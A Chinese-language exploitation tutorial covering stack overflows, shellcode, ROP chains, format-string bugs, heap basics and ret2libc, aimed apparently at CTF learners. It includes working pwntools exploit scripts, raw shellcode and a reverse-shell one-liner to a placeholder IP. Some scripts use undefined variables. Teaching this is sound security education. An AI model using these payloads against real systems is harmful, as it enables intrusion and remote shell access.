## 1. 📌 栈溢出原理——覆盖返回地址

### 🏢 生活类比：叠书被推倒

```
栈 = 一摞书

正常情况：
  第1本书: main的记事本
  第2本书: 书签（返回地址——看完这页要翻回去的地方）
  第3本书: func的记事本（局部变量 buf[8]）

攻击者做的事：
  往第3本书（buf）里塞了太多内容
  → 内容爆出来了，把第2本书（书签）上的字也改了
  → func看完这页，看"书签"说翻到第X页
  → 但X已经被攻击者改成了别的地方（恶意代码的位置）
  → 程序跳到了不该去的地方！
```

### 漏洞代码

```c
#include <stdio.h>
#include <string.h>

void vulnerable() {
    char buf[64];                        // 只分配了64字节
    gets(buf);                           // 读多少写多少，不检查
    printf("你输入了: %s\n", buf);
}

int main() {
    vulnerable();
    return 0;
}
```

### 图解攻击过程

```
调用 gets 之前:                     gets 写入过量数据后:

高地址                             高地址
┌──────────────┐                   ┌──────────────┐
│ main的栈帧    │                   │ main的栈帧    │
├──────────────┤                   ├──────────────┤
│ main的旧rbp   │                   │ 0x41414141   │ ← 被覆盖(A=0x41)
├──────────────┤                   ├──────────────┤
│ ★返回地址     │ ← 存的是main中的地址  │ 0x400123     │ ← ★被改成了攻击者指定的地址
├──────────────┤                   ├──────────────┤
│ 旧的rbp      │                   │ 0x41414141   │ ← 被覆盖
├──────────────┤                   ├──────────────┤
│ buf[63]      │                   │ 'A'          │
│ buf[62]      │                   │ 'A'          │
│ ...          │ ← buf正常范围      │ ...          │ ← 64个'A'后继续往外写
│ buf[0]       │                   │ 'A'          │
├──────────────┤                   ├──────────────┤
│ ...          │                   │ ...          │
低地址                             低地址
```

### 💻 计算偏移量——覆盖到返回地址需要多少字节？

```python
# 用 pwntools 的 cyclic 功能
from pwn import *

pattern = cyclic(200)          # 生成200字节不重复的字符串
# 输入给程序，程序崩溃后看 RIP 的值
# RIP = 0x6161616c (cyclic中的某个子串)
offset = cyclic_find(0x6161616c)  # 算出偏移: 比如72
print(f"偏移量: {offset}")        # 前72字节后就是返回地址
```

### 💻 完整的攻击脚本

```python
from pwn import *

# 目标: 调用程序中的 win 函数（0x400567），它会执行 system("/bin/sh")

p = process("./vuln")

# 构造 payload
payload = b"A" * 72          # 填充 buf + rbp（72字节）
payload += p64(0x400567)     # 覆盖返回地址为 win 函数的地址

p.sendline(payload)
p.interactive()               # 拿到 shell！
```

## 2. shellcode编写

### 🏢 生活类比

```
shellcode = 入侵者自带的"小工具包"

你不能只让程序跳到空白处，你得告诉它跳到之后做什么。
shellcode 就是一段短小精悍的机器码，完成一件事：
  → 启动一个shell（/bin/sh）
  → 反弹连接到你的服务器
  → 读某个文件
```

### shellcode 的类型

```
execve("/bin/sh") 型：
  在目标机器上启动一个shell——需要在本地操作

反弹shell型：
  目标机器主动连回你的服务器
  → 比如执行 bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

bind shell型：
  目标机器在某个端口开一个shell监听
  → 你连过去
```

### 通用 x86-64 execve("/bin/sh") shellcode

```python
# pwntools 自动生成
from pwn import *

context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
print(shellcode.hex())

# 手写的经典 64位 Linux shellcode（大约30字节）:
# "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
```

### 💻 把 shellcode 放进攻击中

```python
from pwn import *

# 攻击思路: 先把 shellcode 放在 buf 里，然后让返回地址指向 buf

p = process("./vuln")

# 传统的栈可执行情况下:
shellcode = asm(shellcraft.sh())
payload = shellcode                    # shellcode在buf里
payload += b"A" * (72 - len(shellcode))  # 填充到返回地址
payload += p64(buf_address)           # 返回地址指向buf开头

p.sendline(payload)
p.interactive()

# 但现代系统默认 NX(栈不可执行)！
# 所以现在更常用的是 ROP 技术
```

## 3. 📌 ROP——面向返回编程

### 🏢 生活类比

```
ROP = 在图书馆里用书签拼出你想要的书

场景：
  图书馆规定不能拿新书进来（NX：栈不可执行，不能注入自己的代码）
  但图书馆里有各种片段（gadget）散落在各本书里
  
攻击者做的事：
  在已有的书里找有用的片段（以 ret 结尾的短指令序列）
  用书签（返回地址）把它们串起来
  串完恰好实现了你想要的功能

rop链 = 一串书签，每张指导你去读一本书的某一页
```

### 什么是 Gadget？

```asm
; gadget: 以 ret 结尾的一段已有的指令

; 原程序里某处的代码:
pop rdi        ; 把栈顶的值弹出到 rdi
ret            ; 返回（取下一个栈上的地址）

; ROP 就是: 给这一小段起个名字叫 "pop rdi; ret"
; 你在栈上排好: [gadget地址] [你要的值] [下一个gadget地址] ...
; 程序执行到 ret 时取栈上的地址跳过去 → 完美串起来了
```

### 💻 ROP 链构造实战

```python
from pwn import *

# 情景: 64位Linux程序，NX（栈不可执行），没有开ASLR
# 目标: 调用 system("/bin/sh")

elf = ELF("./vuln")
rop = ROP(elf)

# 找 gadget
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]  # 用来放第一个参数
ret = rop.find_gadget(['ret'])[0]                  # 栈对齐用的

system_addr = elf.plt['system']   # system 函数在 PLT 中的地址
binsh_addr = next(elf.search(b'/bin/sh'))  # 程序中 "/bin/sh" 字符串的地址

# 构造 ROP 链
payload = b"A" * 72             # 填充到返回地址

# 在64位系统中，第一个参数放 RDI 里
payload += p64(ret)             # 栈对齐（某些系统需要）
payload += p64(pop_rdi)         # ① 跳到这里，把栈上"/bin/sh"地址弹出到RDI
payload += p64(binsh_addr)      # ② "/bin/sh" 的地址（会被pop进RDI）
payload += p64(system_addr)     # ③ 跳到这里执行 system("/bin/sh")！

p.sendline(payload)
p.interactive()
```

### 图解 ROP 链在栈上

```
高地址（先入栈）
┌──────────────────────┐
│ system_addr          │ ← ④ ret 后执行 system("/bin/sh")，搞定！
├──────────────────────┤
│ binsh_addr           │ ← ③ pop rdi 时进 RDI（system的参数）
├──────────────────────┤
│ pop_rdi_ret          │ ← ② 第一次 ret 到这里，执行 pop rdi; ret
├──────────────────────┤
│ ret                  │ ← ① 栈对齐
├──────────────────────┤
│ AAAAAAAAAA...        │ ← 填充 buf
└──────────────────────┘
低地址
```

## 4. 格式化字符串漏洞

### 🏢 生活类比

```
printf = 快递分拣员

正常用:
  printf("您的名字是 %s", name);
  分拣员: "哦，%s 的位置要放 name 这个参数"

漏洞用法:
  printf(name);    // 把用户输入直接当格式化字符串！
  name = "%x %x %x"
  分拣员: "%x? 让我去栈上拿东西……这个值、这个值、还那个值……"
  分拣员: "等等你根本没给我参数啊，但栈上正好有敏感信息……"

  → 攻击者用 %x/%p 读取栈上的任意数据
  → 用 %n 把数值写入任意内存地址！
```

### 💻 攻击步骤

```c
// 漏洞代码
char buf[100];
scanf("%s", buf);
printf(buf);     // 直接用用户输入当格式化字符串！
```

```
攻击过程:

1. 泄露栈数据:
   输入: %p.%p.%p.%p.%p.%p
   → 输出栈上的6个值，可能包含stack cookie、libc地址等

2. 利用 %n 写任意地址:
   输入: \xfc\xd9\xff\xbf%7$n  → 向地址 0xbffff9fc 写入一个值
   (把要写的地址放栈上，%n 参数指定在栈上的第几个位置)

3. 覆盖 GOT 表:
   先泄露 libc 地址 → 算出 system 的地址
   → 用 %n 把 printf 的 GOT 表项改成 system 的地址
   → 下次调用 printf 实际会执行 system！
```

## 5. 堆利用入门

### 堆溢出简介

```
栈溢出的本质：往低地址方向溢出覆盖控制数据
堆溢出的本质：往高地址方向溢出覆盖下一个堆块的头部或数据

堆块结构（简化）:
┌──────────────┐
│ prev_size    │ ← 前一个块的大小
├──────────────┤
│ size + flags │ ← 本块大小 + 标志位
├──────────────┤
│ FD指针       │ ← 指向前一个空闲块（如果本块空闲）
├──────────────┤
│ BK指针       │ ← 指向后一个空闲块
├──────────────┤
│ 用户数据      │ ← malloc 返回的指针指向这里
└──────────────┘

溢出：往"用户数据"里写超过分配大小的数据
     → 覆盖了下一个堆块的头和数据
     → 利用 FD/BK 指针改写任意内存（unlink 攻击等）
```

### 堆漏洞常见类型

| 漏洞类型 | 原理 | 难度 |
|---------|------|:--:|
| 堆溢出 | 写数据越界覆盖下一个堆块 | ⭐⭐ |
| Use-After-Free (UAF) | free 后还继续用那块内存 | ⭐⭐⭐ |
| Double Free | 对同一块 free 两次 | ⭐⭐ |
| Fastbin Attack | 利用 fastbin 的单链表结构 | ⭐⭐⭐ |

**堆利用比栈溢出复杂很多，建议先精通栈溢出再碰堆。**

## 6. 保护机制与绕过

现代系统默认开启多种保护，攻击时需要逐个绕过：

```
┌─────────────────────────────────────────────┐
│              保护机制一览                      │
├─────────────┬──────────┬────────────────────┤
│ 名称        │ 作用      │ 绕过思路             │
├─────────────┼──────────┼────────────────────┤
│ NX/DEP     │ 栈不可执行 │ ROP/ret2libc       │
│ ASLR       │ 地址随机化 │ 先泄露地址           │
│ Stack Canary│ 栈金丝雀  │ 泄露 canary 值后写入  │
│ PIE        │ 代码段随机 │ 先泄露代码地址       │
│ RELRO      │ GOT只读   │ 改其他可写区域       │
│ FORTIFY    │ 编译时检查 │ 找未加保护的函数路径   │
└─────────────┴──────────┴────────────────────┘
```

### 绕过 ASLR 的思路

```
1. 先泄露一个地址（比如 puts 的 GOT 表项——里面有 puts 在内存中的真实地址）
2. 用泄漏的地址 - puts 在 libc 中的偏移 = libc 基址
3. libc 基址 + system偏移 = system 的真实地址
4. libc 基址 + "/bin/sh"偏移 = "/bin/sh" 字符串的真实地址
5. 构造 payload 调用 system("/bin/sh")

→ 这就是经典的 ret2libc 攻击
```

### 💻 ret2libc 攻击脚本（完整版）

```python
from pwn import *

p = process("./vuln")
elf = ELF("./vuln")
libc = ELF("./libc.so.6")     # 目标服务器用的 libc

# Step 1: 泄露 puts 的真实地址
pop_rdi = 0x4006b3            # pop rdi; ret
payload = b"A" * 72
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])  # puts 的 GOT 表地址
payload += p64(elf.plt['puts'])  # 调用 puts 来打印 puts_got 的内容
payload += p64(elf.symbols['main'])  # 泄露后返回 main，再来一次

p.recvuntil(b"input: ")
p.sendline(payload)

# 收到泄露的地址
leaked_puts = u64(p.recv(6).ljust(8, b'\x00'))
print(f"泄露的 puts 地址: {hex(leaked_puts)}")

# Step 2: 计算 system 和 /bin/sh 的真实地址
libc_base = leaked_puts - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
print(f"libc基址: {hex(libc_base)}")

# Step 3: 第二次攻击——真正调用 system("/bin/sh")
payload2 = b"A" * 72
payload2 += p64(ret)           # 栈对齐
payload2 += p64(pop_rdi)
payload2 += p64(binsh_addr)
payload2 += p64(system_addr)

p.recvuntil(b"input: ")
p.sendline(payload2)
p.interactive()                 # 拿到 shell！
```

## 7. 逆向分析工具

### IDA Pro —— 行业标准

```
功能: 把二进制文件反汇编成可读的伪代码
特点: 收费（有免费的 IDA Free），极其强大
使用: 打开文件 → 找到 main 函数 → 按 F5 看伪代码
  → 就像把 Linux 二进制翻译回 C 代码

核心操作:
  F5: 反编译为伪代码
  Shift+F12: 查看字符串（找 "/bin/sh"、"flag" 等）
  G: 跳转到指定地址
  X: 查看交叉引用（谁引用了这个函数/变量？）
```

### Ghidra —— NSA开源的免费替代品

```
功能: 和 IDA 类似，免费开源
优点: 反编译能力强，支持插件扩展
缺点: 比 IDA 慢，Java程序内存消耗大
```

### GDB + 插件

```bash
# 装 pwndbg 或 gef 插件（强烈推荐！）
# pwndbg 安装:
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# 装了之后 GDB 会显示:
# → 寄存器值
# → 栈内容
# → 反汇编
# → 堆块信息
# 全在一个屏幕里！效率翻十倍！
```
